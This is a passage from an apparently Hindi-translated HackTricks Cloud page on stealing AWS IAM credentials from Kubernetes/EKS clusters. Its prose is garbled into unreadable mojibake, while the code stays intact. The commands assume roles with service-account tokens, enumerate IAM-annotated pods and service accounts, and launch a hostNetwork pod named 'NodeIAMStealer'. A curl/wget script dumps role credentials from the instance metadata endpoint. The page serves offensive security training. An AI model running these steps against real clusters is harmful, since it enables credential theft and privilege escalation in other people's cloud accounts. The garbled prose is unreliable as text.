**рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ aws рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛рдПрдВ:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ, рдпрджрд┐ рдЖрдк рдПрдХ рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ (K8s) рдХреНрд▓рд╕реНрдЯрд░ рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ **рдЙрд╕ рдПрдиреЛрдЯреЗрд╢рди рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ **AWS рдореЗрдВ рдЙрдиреНрдирддрд┐ рдХреЗ рд▓рд┐рдП**ред рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдмрд╕ рдПрдХ **рдкреЙрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ IAM **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ** рдореЗрдВ **exec/create** рдХрд░реЗрдВ рдФрд░ рдЯреЛрдХрди рдЪреБрд░рд╛ рд▓реЗрдВред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрджрд┐ рдЖрдк рдПрдХ рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рддреЛ **AWS\_ROLE\_ARN** рдФрд░ **AWS\_WEB\_IDENTITY\_TOKEN** рдЬреИрд╕реЗ env variables рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
{% endhint %}

{% hint style="danger" %}
рдХрднреА-рдХрднреА рдПрдХ рднреВрдорд┐рдХрд╛ рдХреА **рд╡рд┐рд╢реНрд╡рд╛рд╕ рдиреАрддрд┐** рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдФрд░ рдЙрдореНрдореАрджрд╡рд╛рд░ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЛ AssumeRole рдПрдХреНрд╕реЗрд╕ рджреЗрдиреЗ рдХреА рдмрдЬрд╛рдп, рдпрд╣ рдЙрдиреНрд╣реЗрдВ **рд╕рднреА рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ** рдХреЛ рджреЗрддреА рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдирд┐рдпрдВрддреНрд░рд┐рдд рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдкрд░ рдПрдХ рдПрдиреЛрдЯреЗрд╢рди рд▓рд┐рдЦрдиреЗ рдХреА рд╕рдХреНрд╖рдорддрд╛ рд░рдЦрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рднреВрдорд┐рдХрд╛ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ IAM рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдкреЙрдб рдФрд░ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ

рдпрд╣ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ рдЬреЛ **рд╕рднреА рдкреЙрдб рдФрд░ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ** рдХреА рдкрд░рд┐рднрд╛рд╖рд╛рдПрдБ **рдЗрдЯрд░реЗрдЯ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рд╣реИ рдЬреЛ **рдЙрд╕ рдПрдиреЛрдЯреЗрд╢рди** рдХреА **рдЦреЛрдЬ** рдХрд░ рд░рд╣рд╛ рд╣реИ:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### рдиреЛрдб IAM рднреВрдорд┐рдХрд╛

рдкрд┐рдЫрд▓рд╛ рдЦрдВрдб IAM рднреВрдорд┐рдХрд╛рдУрдВ рдХреЛ рдкреЙрдбреНрд╕ рдХреЗ рд╕рд╛рде рдХреИрд╕реЗ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдерд╛, рд▓реЗрдХрд┐рди рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ K8s рдХреНрд▓рд╕реНрдЯрд░ рдХрд╛ рдПрдХ **рдиреЛрдб** рдПрдХ **рдмрд╛рджрд▓ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдЙрджрд╛рд╣рд░рдг** рд╣реЛрдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдиреЛрдб рдХреЗ рдкрд╛рд╕ рдПрдХ рдирдпрд╛ IAM рднреВрдорд┐рдХрд╛ рд╣реЛрдиреЗ рдХреА рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдк рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ (_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ K8s рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рд╕рднреА рдиреЛрдбреЛрдВ рдХреЗ рдкрд╛рд╕ рдПрдХ рд╣реА IAM рднреВрдорд┐рдХрд╛ рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдкреНрд░рддреНрдпреЗрдХ рдиреЛрдб рдкрд░ рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпреЛрдЧреНрдп рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ_ред)

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдиреЛрдб рд╕реЗ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдЖрдкрдХреЛ рдиреЛрдб рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (ssh рд╕рддреНрд░?) рдпрд╛ рдХрдо рд╕реЗ рдХрдо рд╡рд╣реА рдиреЗрдЯрд╡рд░реНрдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### IAM рднреВрдорд┐рдХрд╛ рдЯреЛрдХрди рдЪреБрд░рд╛рдирд╛

рдкрд╣рд▓реЗ рд╣рдордиреЗ рдЪрд░реНрдЪрд╛ рдХреА рдереА рдХрд┐ **рдкреЙрдбреНрд╕ рдХреЛ IAM рднреВрдорд┐рдХрд╛рдУрдВ рд╕реЗ рдЬреЛрдбрд╝рдиреЗ** рдпрд╛ рдпрд╣рд╛рдБ рддрдХ рдХрд┐ **рдиреЛрдб рдкрд░ рднрд╛рдЧрдиреЗ рдХреЗ рд▓рд┐рдП IAM рднреВрдорд┐рдХрд╛ рдЪреБрд░рд╛рдиреЗ** рд╡рд╛рд▓реЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рдПред

рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдкрдиреА рдирдИ рдореЗрд╣рдирдд рдХреА **IAM рднреВрдорд┐рдХрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## рд╕рдВрджрд░реНрдн

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдХреЛ** **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}
